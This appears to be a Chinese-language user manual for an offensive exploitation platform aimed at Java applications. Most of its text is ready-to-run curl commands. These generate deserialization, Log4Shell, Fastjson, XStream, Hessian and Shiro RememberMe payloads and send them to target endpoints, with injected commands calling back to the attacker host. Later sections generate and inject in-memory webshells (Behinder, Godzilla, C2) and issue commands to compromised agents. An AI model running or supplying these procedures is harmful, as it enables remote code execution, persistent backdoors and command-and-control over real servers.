# OOBserver-Next 使用手册

> **版本** 3.0 · 2026-05-01  
> **定位** 内网 OOB (Out-of-Band) 漏洞利用平台

---

## 1. 系统架构

```
┌───────────────────────────────────────────────────────┐
│                   OOBserver（攻击机）                    │
│                                                       │
│   :8010  FastAPI 后端（JWT 认证，主入口）                  │
│   :8711  Bytecode Sidecar（payload 生成 + java-chains） │
│   :1389  LDAP Listener                               │
│   :1099  RMI  Listener                               │
│   :9999  TCP  Collector                              │
└───────────────────────────────────────────────────────┘
          │  HTTP / LDAP / RMI / TCP OOB 回调
          ▼
   目标主机（任意存在漏洞的 Java 应用）
```

```bash
export OOB=<OOBserver IP>
export OOB_API=http://$OOB:8010
export OOB_SIDECAR=http://$OOB:8711
```

---

## 2. 快速开始

### 2.1 登录 & 获取 JWT

```bash
JWT=$(curl -sf -X POST $OOB_API/api/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin123" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

### 2.2 创建 OOB Token

```bash
TOKEN=$(curl -sf -X POST $OOB_API/api/tokens \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"project_id":1,"label":"test-1","intent":"record"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

### 2.3 查询回调事件

```bash
curl -sf -H "Authorization: Bearer $JWT" \
  "$OOB_API/api/tokens/$TOKEN/events" | python3 -m json.tool
```

---

## 3. Payload 生成

### 3.1 后端 API（推荐）

```
POST $OOB_API/api/payloads/generate
Authorization: Bearer $JWT
Content-Type: application/json

{"type": "CHAIN_ID", "params": {"cmd": "COMMAND", ...}}

返回: {"type":"...","content_type":"...","value":"<base64>"}
```

```bash
CMD="curl -sk $OOB_API/$TOKEN/rce -o /tmp/oobx_${TOKEN:0:12}"

curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"ysoserial_cc6\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; open('/tmp/payload.bin','wb').write(base64.b64decode(json.load(sys.stdin)['value']))"
```

### 3.2 Sidecar API（低级接口）

```
POST $OOB_SIDECAR/generate
Content-Type: application/json
{"chain": "CHAIN_ID", "params": {"cmd": "COMMAND", ...}}
```

### 3.3 ⚠️ CMD 规则

`Runtime.exec(String)` 不解析 shell 元字符（`>`、`&&`、`|`、`;`），Java 按空格分词。

- ✅ `curl -sk http://$OOB:8010/$TOKEN/rce -o /tmp/oobx_TOKEN`
- ❌ `id > /tmp/out && curl http://...`

---

## 4. 利用链

### 4.1 CommonsCollections

| Chain | 目标依赖 | 说明 |
|-------|---------|------|
| `ysoserial_cc5` | CC 3.x | 任意 JDK |
| `ysoserial_cc6` | CC 3.x | 任意 JDK，**最通用** |
| `ysoserial_cc7` | CC 3.x | 任意 JDK |
| `ysoserial_cc1` | CC 3.x | JDK ≤ 8u71（AIH 未修补） |
| `ysoserial_cc3` | CC 3.x | JDK ≤ 8u71 |
| `ysoserial_cc2` | CC **4.x** | 任意 JDK |
| `ysoserial_cc4` | CC **4.x** | 任意 JDK |
| `jchains_cc1–cc6` | CC 3.x/4.x | java-chains 增强版 |

```bash
curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"ysoserial_cc6\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; open('/tmp/cc6.bin','wb').write(base64.b64decode(json.load(sys.stdin)['value']))"

curl -sf -X POST http://TARGET/deser \
  -H "Content-Type: application/octet-stream" --data-binary @/tmp/cc6.bin
```

### 4.2 CommonsBeanUtils

| Chain | 目标依赖 |
|-------|---------|
| `ysoserial_cb1` | BeanUtils 1.x + CC |
| `cb_no_cc` | BeanUtils 1.x（无 CC 依赖） |
| `jchains_native_cb1` | BeanUtils 1.x |
| `jchains_native_cb2` | BeanUtils **1.8.3** |

### 4.3 其他 Java 反序列化

| Chain | 目标依赖 |
|-------|---------|
| `ysoserial_rome` | rome-1.0 |
| `ysoserial_hibernate1` | Hibernate 4.x |
| `ysoserial_groovy1` | Groovy 2.3.x |
| `ysoserial_jrmp_client` | 任意（触发 RMI 反序列化） |
| `jchains_native_jackson` | Jackson databind |
| `jchains_native_jdk17_1/2` | JDK 17+（高版本绕过） |
| `jchains_native_k1_secondary` | CC 3.x |

### 4.4 Log4Shell — CVE-2021-44228

**目标条件**：Log4j2 ≤ 2.14.1

```bash
# 生成字节码并注册 LDAP rebind
CLASS_B64=$(curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"log4shell_basic\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

curl -sf -X POST "$OOB_API/api/rebind/$TOKEN/set" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"class_name\":\"Exploit\",\"bytecode_b64\":\"$CLASS_B64\"}"

# 注入（单引号防止 bash 展开 ${...}）
JNDI='${jndi:ldap://'"$OOB"':1389/'"$TOKEN"'}'
curl -sf "http://TARGET/" -H "User-Agent: $JNDI"
```

### 4.5 Fastjson — CVE-2019-14439 / ≤1.2.47

Content-Type: `application/json`

| Chain | 说明 |
|-------|------|
| `fastjson_jdbcrowset` | JNDI 触发，JDK ≤ 8u191 |
| `fastjson_jdbcrowset_v2` | JNDI bypass |
| `fastjson_bcel` | BCEL 直接执行，**无需 JNDI** |
| `jchains_fastjson` | JNDI（≤1.2.47） |
| `jchains_fastjson_bcel` | BCEL（≤1.2.24） |
| `jchains_fastjson_jndi` | JNDI 变体 |
| `jchains_fastjson_c3p0_h2` | C3P0 + H2 JDBC |

```bash
# BCEL 直接 RCE（无需 LDAP 基础设施）
curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"fastjson_bcel\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; print(base64.b64decode(json.load(sys.stdin)['value']).decode())" \
  | curl -sf -X POST http://TARGET/fastjson -H "Content-Type: application/json" -d @-
```

### 4.6 XStream — CVE-2021-39144

Content-Type: `application/xml`

| Chain | 说明 |
|-------|------|
| `xstream_eventhandler` | EventHandler RCE，XStream ≤ 1.4.17 |
| `jchains_xstream_exec` | 直接命令执行 |
| `jchains_xstream` | Spring JNDI |
| `jchains_xstream_jndi` | JNDI 触发 |

```bash
curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"xstream_eventhandler\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; print(base64.b64decode(json.load(sys.stdin)['value']).decode())" \
  | curl -sf -X POST http://TARGET/xstream -H "Content-Type: application/xml" -d @-
```

### 4.7 Hessian 反序列化

Content-Type: `application/octet-stream`（Hessian1：`/hessian`，Hessian2：`/hessian2`）

#### Hessian1（9条）

| Chain | 参数 | 说明 |
|-------|------|------|
| `hessian1_spring` | `jndi_url` | LDAP 触发 |
| `jchains_hessian1_spring` | `jndi_url` | Spring JNDI |
| `jchains_hessian1_spring2` | `jndi_url` | Spring JNDI 变体 |
| `jchains_hessian1_exec` | `cmd` | 直接执行 |
| `jchains_hessian1_bcel` | `cmd` | BCEL 字节码 |
| `jchains_hessian1_rome1` | `cmd` | ROME+CB1 二次反序列化 |
| `jchains_hessian1_rome2` | `cmd` | ROME2+CB1 |
| `jchains_hessian1_secondary` | `cmd` | 二次反序列化绕黑名单 |
| `jchains_hessian1_spring_exec` | `cmd` | Spring MethodInvokingFactoryBean，需 Spring 4.2.x + Hessian |

#### Hessian2（11条）

| Chain | 参数 | 说明 |
|-------|------|------|
| `hessian2_spring` | `jndi_url` | LDAP 触发 |
| `jchains_hessian2_spring` | `jndi_url` | Spring JNDI |
| `jchains_hessian2_spring2` | `jndi_url` | Spring JNDI 变体 |
| `jchains_hessian2_exec` | `cmd` | 直接执行 |
| `jchains_hessian2_bcel` | `cmd` | BCEL 字节码 |
| `jchains_hessian2_rome1` | `cmd` | ROME+CB1 |
| `jchains_hessian2_rome2` | `cmd` | ROME2+CB1 |
| `jchains_hessian2_secondary` | `cmd` | 二次反序列化绕黑名单 |
| `jchains_hessian2_tostring_jackson` | `cmd` | Jackson toString 二次反序列化 |
| `jchains_hessian2_tostring_xbean` | `cmd` | XBean toString + Tomcat EL，需 Tomcat ≤ 9.0.61 |
| `jchains_hessian2_spring_exec` | `cmd` | Spring MethodInvokingFactoryBean，需 Spring 4.2.x + Hessian |

```bash
curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"jchains_hessian2_exec\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; open('/tmp/h2.bin','wb').write(base64.b64decode(json.load(sys.stdin)['value']))"

curl -sf -X POST http://TARGET/hessian2 \
  -H "Content-Type: application/octet-stream" --data-binary @/tmp/h2.bin
```

### 4.8 Shiro RememberMe

| Chain | 协议 | 目标条件 |
|-------|------|---------|
| `shiro_cbc` | AES-CBC，CVE-2016-4437 | Shiro ≤ 1.2.4，默认 key |
| `shiro_gcm` | AES-GCM，CVE-2020-11989 | Shiro ≥ 1.5.3 |
| `jchains_shiro_cbc` | AES-CBC | 同 shiro_cbc |

```bash
COOKIE=$(curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"shiro_cbc\",\"params\":{\"cmd\":\"$CMD\",\"key_b64\":\"kPH+bIxk5D2deZiIxcaaaA==\"}}" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

curl -v "http://TARGET/login" -H "Cookie: rememberMe=$COOKIE"
# Set-Cookie: rememberMe=deleteMe → 反序列化触发
```

> 支持自定义 key：将 `key_b64` 替换为目标实际 AES key 的 base64。

### 4.9 C3P0 二次反序列化

| Chain | 说明 |
|-------|------|
| `c3p0_jndi` | JNDI 触发，需目标 JVM 发起 JNDI 请求 |
| `c3p0_wrapperds` | 嵌套序列化，`inner_chain` 可配置（默认 ysoserial_cc6） |

### 4.10 JNDI 本地工厂（绕过 trustURLCodebase，JDK ≥ 8u191）

利用目标 classpath 中已有的工厂类执行代码，无需远程 class 加载：

| Chain | 工厂 | 目标条件 |
|-------|------|---------|
| `jchains_jndi_tomcat_el` | TomcatEL + BeanFactory | Tomcat ≤ 9.0.61 / 8.5.77 |
| `jchains_jndi_groovy` | Groovy ScriptEngine | Groovy 在 classpath |
| `jchains_jndi_beanshell` | BeanShell | BeanShell 在 classpath |
| `jchains_jndi_snakeyaml` | SnakeYAML SPI | SnakeYAML 在 classpath |

```bash
JNDI_URL="ldap://$OOB:1389/$TOKEN"

curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"jchains_jndi_tomcat_el\",\"params\":{\"cmd\":\"$CMD\",\"jndi_url\":\"$JNDI_URL\"}}" \
  | python3 -c "import sys,json,base64; print(base64.b64decode(json.load(sys.stdin)['value']).decode())"
# 将返回的 JNDI URL 注入到目标 JNDI lookup 触发点
```

### 4.11 H2 JDBC 任意代码执行

**目标条件**：H2 数据库，JDBC URL 可控（如 dataSourceName、connectionURL 参数）

```bash
curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"jchains_h2_jdbc\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; print(base64.b64decode(json.load(sys.stdin)['value']).decode())"
# 返回形如 jdbc:h2:mem:...;INIT=RUNSCRIPT FROM 'http://...' 的 URL
```

### 4.12 SnakeYAML SPI

**目标条件**：SnakeYAML ≤ 1.31，`Yaml.load()` 接受用户输入

```bash
curl -sf -X POST $OOB_API/api/payloads/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"type\":\"snakeyaml_spi\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; print(base64.b64decode(json.load(sys.stdin)['value']).decode())"
# 返回 !!javax.script.ScriptEngineManager [...] 格式的 YAML，注入到 Yaml.load() 参数
```

---

## 5. 内存马 & C2

### 5.1 生成内存马

```bash
MS=$(curl -sf -X POST $OOB_API/api/memshells/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d '{
    "framework": "tomcat",
    "type": "filter",
    "shell_type": "cmd",
    "params": {"url_pattern": "/cmd", "password": "pass1234", "servlet_api": "javax"}
  }')

CLASS_NAME=$(echo "$MS" | python3 -c "import sys,json; print(json.load(sys.stdin)['class_name'])")
CLASS_B64=$(echo "$MS"  | python3 -c "import sys,json; print(json.load(sys.stdin)['class_bytes'])")
```

| framework | 支持 type |
|-----------|----------|
| `tomcat` | `filter`、`valve`、`listener`、`servlet`、`executor` |
| `spring` | `interceptor`、`controller`、`webflux` |
| `jetty` | `filter` |
| `jboss` | `filter` |
| `weblogic` | `filter` |

**shell_type**：`cmd`（命令执行）、`behinder`（冰蝎）、`godzilla`（哥斯拉）、`c2`（内置 C2）

### 5.2 注入内存马

```bash
# 方式 A：JNDI rebind（目标发起 JNDI 请求）
curl -sf -X POST "$OOB_API/api/rebind/$TOKEN/set" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"class_name\":\"$CLASS_NAME\",\"bytecode_b64\":\"$CLASS_B64\"}"
# → 配合任意 JNDI 触发链注入

# 方式 B：反序列化直接注入（Java 序列化端点）
curl -sf -X POST $OOB_API/api/memshells/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{...，\"serialize_chain\":\"ysoserial_cc6\"}" \
  | python3 -c "import sys,json,base64; open('/tmp/ms.bin','wb').write(base64.b64decode(json.load(sys.stdin)['value']))"

curl -sf -X POST http://TARGET/deser \
  -H "Content-Type: application/octet-stream" --data-binary @/tmp/ms.bin
```

### 5.3 C2 操作

```bash
# 查看上线 agents
curl -sf -H "Authorization: Bearer $JWT" "$OOB_API/api/c2/agents"

# 发送命令
curl -sf -X POST "$OOB_API/api/c2/agents/$AGENT_ID/cmd" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d '{"cmd": "id"}'

# 查看结果（等待 heartbeat，约 10s）
sleep 10
curl -sf -H "Authorization: Bearer $JWT" "$OOB_API/api/c2/agents/$AGENT_ID/commands"
```

---

## 6. JNDI 基础设施

### 6.1 注册 LDAP rebind

**模式 A — javaCodeBase**（JDK ≤ 8u191，远程加载 class）

```bash
curl -sf -X POST "$OOB_API/api/rebind/$TOKEN/set" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"class_name\":\"Exploit\",\"bytecode_b64\":\"$CLASS_B64\"}"
```

**模式 B — javaSerializedData**（JDK ≥ 8u191，绕过 trustURLCodebase）

```bash
curl -sf -X POST "$OOB_API/api/rebind/$TOKEN/set" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"class_name\":\"Payload\",\"serialized_b64\":\"$CC6_B64\"}"
# LDAP 返回 javaSerializedData，目标 JVM 直接反序列化
```

### 6.2 等待回调

```bash
for i in $(seq 1 15); do
  sleep 2
  N=$(curl -sf -H "Authorization: Bearer $JWT" "$OOB_API/api/tokens/$TOKEN/events" \
    | python3 -c "import sys,json; e=json.load(sys.stdin); print(len(e),'events',[x.get('protocol') for x in e])")
  echo "[$i] $N"; [[ "$N" != "0 events"* ]] && break
done
```

---

## 7. 链列表（86 条已验证）

### Java 原生反序列化

| 分类 | Chain ID | 目标依赖 |
|------|----------|---------|
| CC | `ysoserial_cc5/cc6/cc7` | CC 3.x，任意 JDK |
| CC | `ysoserial_cc1/cc3` | CC 3.x，JDK ≤ 8u71 |
| CC | `ysoserial_cc2/cc4` | CC 4.x |
| CC | `jchains_cc1–cc6`、`jchains_native_cc6` | CC 3.x/4.x |
| CB | `ysoserial_cb1`、`cb_no_cc` | BeanUtils 1.x |
| CB | `jchains_native_cb1/cb2` | BeanUtils 1.x/1.8.3 |
| 其他 | `ysoserial_rome/hibernate1/groovy1` | 对应 jar |
| 其他 | `jchains_native_jackson/k1_secondary` | Jackson/CC |
| JDK17 | `jchains_native_jdk17_1/2` | 高版本 JDK 绕过 |
| JNDI | `jchains_native_cb1_jndi` | BeanUtils，LDAP |
| JRMP | `ysoserial_jrmp_client` | 任意 |

### Hessian

全部 20 条，见 §4.7。

### FastJSON

全部 7 条，见 §4.5。

### XStream

全部 4 条，见 §4.6。

### Log4Shell

`log4shell_basic`（通用）

### Shiro

`shiro_cbc`、`shiro_gcm`、`jchains_shiro_cbc`

### C3P0

`c3p0_jndi`、`c3p0_wrapperds`

### JNDI 本地工厂

`jchains_jndi_tomcat_el`、`groovy`、`beanshell`、`snakeyaml`、`jchains_h2_jdbc`

### 内存马

14 种框架 × 类型 × shell 组合，含 C2 Agent 上线。

---

## 8. API 速查

### 后端（:8010）

```
POST /api/auth/login              登录
POST /api/tokens                  创建 OOB token
GET  /api/tokens/{token}/events   查询回调事件

POST /api/payloads/generate       生成 payload
POST /api/memshells/generate      生成内存马

POST /api/rebind/{token}/set      注册 LDAP rebind
DEL  /api/rebind/{token}/clear    清除 rebind

GET  /api/c2/agents               C2 agents 列表
POST /api/c2/agents/{id}/cmd      执行命令
GET  /api/c2/agents/{id}/commands 命令结果

GET  /docs                        Swagger 文档
```

### Sidecar（:8711）

```
GET  /chains          列出所有支持的链 ID
POST /generate        生成 payload（低级接口）
```

---

## 9. 常见问题

**Q: CMD 为什么不能用 `>`、`&&`、`|`？**  
A: 多数链使用 `Runtime.exec(String)` 按空格分词，不经 shell 解释。用 `curl`/`wget` 做 OOB 回调即可确认 RCE；若需 shell 特性，改用 `/bin/sh -c "cmd"` 格式（部分 jchains 链支持）。

**Q: 哪些链不需要 LDAP 基础设施？**  
A: 所有带 `cmd` 参数的链均直接执行：`ysoserial_cc5/6/7`、`fastjson_bcel`、`xstream_eventhandler`、`jchains_*_exec/rome/bcel/secondary/spring_exec/tostring_*`、`shiro_cbc/gcm`、`jchains_h2_jdbc` 等。

**Q: JDK ≥ 8u191 环境如何用 Log4Shell / Fastjson JNDI 链？**  
A: 使用 `javaSerializedData` rebind 模式（§6.1 模式 B），LDAP 返回序列化 CC6 对象，绕过 `trustURLCodebase`，不依赖远程 class 加载。

**Q: xbean 链（jchains_hessian2_tostring_xbean）目标版本要求？**  
A: `BeanFactory.forceString` 在 Tomcat 9.0.62 / 8.5.78 / 10.0.20 中被移除。目标需 Tomcat ≤ 9.0.61（9.x）或 ≤ 8.5.77（8.x）。

**Q: Fastjson payload 需要先 base64 decode 再发送吗？**  
A: 是。后端 API 统一返回 `{"value":"<base64>"}` 格式，JSON/XML 类 payload 发送前需 `base64.b64decode(value).decode()` 还原。

**Q: java-chains 链提示 "Ensure java-chains is running"？**  
A: Sidecar 内嵌的 java-chains 冷启动约需 30s，等 `docker compose ps` 显示 `(healthy)` 后重试。

---

*OOBserver-Next · v3.0 · 2026-05-01*
